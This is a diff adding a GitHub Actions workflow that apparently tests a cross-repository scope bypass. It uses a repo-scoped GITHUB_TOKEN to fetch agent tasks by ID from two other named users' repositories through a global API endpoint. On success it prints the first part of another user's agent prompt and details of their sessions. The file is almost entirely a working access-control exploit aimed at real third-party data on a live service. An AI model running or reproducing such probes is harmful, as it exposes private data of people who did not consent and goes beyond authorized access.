@@ -1,0 +1,81 @@
+name: C1 Agent Task Scope Test
+on: workflow_dispatch
+
+permissions:
+  contents: read
+  # Note: agent_tasks permission - test if GITHUB_TOKEN (scoped to THIS repo) 
+  # can access tasks from OTHER repos via the global endpoint
+
+jobs:
+  test-c1-scope:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Test global agent task endpoint - cross-repo scope bypass
+      env:
+        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      run: |
+        echo "=== Testing C1: Global agent task endpoint scope bypass ==="
+        echo "Token is GITHUB_TOKEN scoped to: ${{ github.repository }}"
+        
+        # Task from rajarshi-29/Location_Tracker (completely different repo/owner)
+        TASK_ID_1="89376531-618c-473a-8bd4-f27cd209dfc0"
+        # Task from faruk-spec/mmbv2 (another different repo/owner)
+        TASK_ID_2="f311ecfb-72dc-4b94-8161-b2e2fea1f97e"
+        
+        echo ""
+        echo "--- Test 1: Task from rajarshi-29/Location_Tracker ---"
+        echo "Task ID: $TASK_ID_1"
+        RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
+          -H "Authorization: Bearer $GH_TOKEN" \
+          -H "Accept: application/vnd.github+json" \
+          -H "X-GitHub-Api-Version: 2022-11-28" \
+          "https://api.github.com/agents/tasks/$TASK_ID_1")
+        
+        HTTP_STATUS=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
+        BODY=$(echo "$RESPONSE" | grep -v "HTTP_STATUS:")
+        
+        echo "HTTP Status: $HTTP_STATUS"
+        if [ "$HTTP_STATUS" = "200" ]; then
+          echo "SCOPE BYPASS CONFIRMED: Cross-repo access succeeded!"
+          echo "Repository in response: $(echo $BODY | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('repository',{}).get('id','unknown'))")"
+          echo "Sessions count: $(echo $BODY | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('sessions',[])))")"
+          echo "First prompt: $(echo $BODY | python3 -c "import sys,json; d=json.load(sys.stdin); s=d.get('sessions',[]); print(s[0].get('prompt','no prompt')[:100] if s else 'no sessions')")"
+        elif [ "$HTTP_STATUS" = "403" ]; then
+          echo "PROPERLY BLOCKED: 403 Forbidden - scope check is working"
+        elif [ "$HTTP_STATUS" = "404" ]; then
+          echo "NOT FOUND: Task may have been deleted"
+        else
+          echo "Unexpected response: $HTTP_STATUS"
+          echo "Body: $BODY"
+        fi
+        
+        echo ""
+        echo "--- Test 2: Task from faruk-spec/mmbv2 ---"
+        echo "Task ID: $TASK_ID_2"
+        RESPONSE2=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
+          -H "Authorization: Bearer $GH_TOKEN" \
+          -H "Accept: application/vnd.github+json" \
+          -H "X-GitHub-Api-Version: 2022-11-28" \
+          "https://api.github.com/agents/tasks/$TASK_ID_2")
+        
+        HTTP_STATUS2=$(echo "$RESPONSE2" | grep "HTTP_STATUS:" | cut -d: -f2)
+        BODY2=$(echo "$RESPONSE2" | grep -v "HTTP_STATUS:")
+        
+        echo "HTTP Status: $HTTP_STATUS2"
+        if [ "$HTTP_STATUS2" = "200" ]; then
+          echo "SCOPE BYPASS CONFIRMED: Cross-repo access succeeded!"
+        elif [ "$HTTP_STATUS2" = "403" ]; then
+          echo "PROPERLY BLOCKED: 403 Forbidden"
+        else
+          echo "Response: $HTTP_STATUS2 - $BODY2"
+        fi
+        
+        echo ""
+        echo "--- Test 3: Same endpoint, repo-scoped path for comparison ---"
+        RESPONSE3=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
+          -H "Authorization: Bearer $GH_TOKEN" \
+          -H "Accept: application/vnd.github+json" \
+          -H "X-GitHub-Api-Version: 2022-11-28" \
+          "https://api.github.com/agents/repos/rajarshi-29/Location_Tracker/tasks/$TASK_ID_1")
+        HTTP_STATUS3=$(echo "$RESPONSE3" | grep "HTTP_STATUS:" | cut -d: -f2)
+        echo "Repo-scoped endpoint status: $HTTP_STATUS3 (expected: 403)"
